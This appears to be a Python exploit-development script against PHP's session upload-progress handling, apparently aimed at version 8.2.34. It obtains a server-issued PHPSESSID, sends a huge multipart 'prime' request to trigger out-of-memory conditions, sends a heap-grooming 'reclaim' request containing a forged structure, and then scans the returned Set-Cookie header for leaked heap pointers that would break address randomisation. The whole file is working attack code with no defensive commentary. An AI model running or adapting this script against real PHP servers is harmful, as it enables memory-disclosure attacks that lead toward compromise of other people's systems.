#!/usr/bin/env python3
"""New angle: use a SERVER-ISSUED session id (not attacker-forged) in the stage-1 leak.
1. POST a simple request to 8.2.34 -> capture server-issued PHPSESSID cookie.
2. Use THAT id in the prime+reclaim leak structure.
3. Check if the Set-Cookie spills a heap pointer (sub-8.3 might need a known session).
"""
import http.client, struct, time, sys

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 18111
H = 0x7F0000000000

def scan(data, need=8):
    best = {}
    for off in range(len(data) - 8):
        v = int.from_bytes(data[off:off+8], "little")
        if H <= v < H + 0x10000000000:
            best[v & ~0x1FFFFF] = best.get(v & ~0x1FFFFF, 0) + 1
    if best:
        b, c = max(best.items(), key=lambda kv: kv[1])
        if c >= 8: return b
    return 0

def do(req_lines, body, timeout=60):
    c = http.client.HTTPConnection("127.0.0.1", PORT, timeout=timeout)
    c.putrequest("POST", "/", skip_host=True)
    for l in req_lines: c.putheader(l.split(":", 1)[0], l.split(":", 1)[1].strip())
    c.endheaders()
    c.send(body)
    r = c.getresponse()
    d = r.read(); c.close()
    return d

def mp(parts, big=None):
    bd = "----b"
    out = b""
    for name, val in parts:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n").encode() + val + b"\r\n"
    if big:
        out += (f"--{bd}\r\nContent-Disposition: form-data; name=\"big\"\r\n\r\n").encode() + big + b"\r\n"
    out += f"--{bd}--\r\n".encode()
    return out

def cookie_of(r):
    for line in r.split(b"\r\n"):
        if line.lower().startswith(b"set-cookie:") and b"phpsessid" in line.lower():
            return line.split(b":", 1)[1].strip()
    return b""

# Step 1: get a server-issued session id
r = do(["Content-Type: application/x-www-form-urlencoded", "Content-Length: 4"], b"a=1")
srv = cookie_of(r)
print(f"server-issued cookie: {srv[:60]!r}", flush=True)
sid = srv.split(b"=", 1)[1] if b"=" in srv else b"attacksessionid0001"
print(f"using session id ({len(sid)}B): {sid!r}", flush=True)

# Step 2: prime (OOM)
prime = [(f"p{i:04d}", b"x") for i in range(1001)]
prime.append(("PHPSESSID", sid)); prime.append(("PHP_SESSION_UPLOAD_PROGRESS", b"pwn"))
body = mp(prime, big=b"B" * (256 * 1024 * 1024))
do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(body)], body, timeout=90)
time.sleep(0.3)

# Step 3: reclaim (leak) with the SERVER session id
rec = [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
for i in range(841):
    rec.append((str(1000 + i), (f"v{i:04d}" + "x" * 44)[:48].encode()))
forged = bytearray(b"A" * 79); struct.pack_into("<Q", forged, 0x10, 0x1000); forged[0x18] = ord("L")
rec.append(("1999", bytes(forged)))
body2 = mp(rec)
r2 = do(["Content-Type: multipart/form-data; boundary=b", "Content-Length: %d" % len(body2)], body2, timeout=60)
ck = cookie_of(r2)
base = scan(ck)
bs = ("0x%08x" % base) if base else "0x0"
print(f"reclaim cookie={len(ck)}B base={bs}", flush=True)
print("*** LEAK with server-issued id ***" if base else "no leak (server-issued id also rejected on sub-8.3)", flush=True)
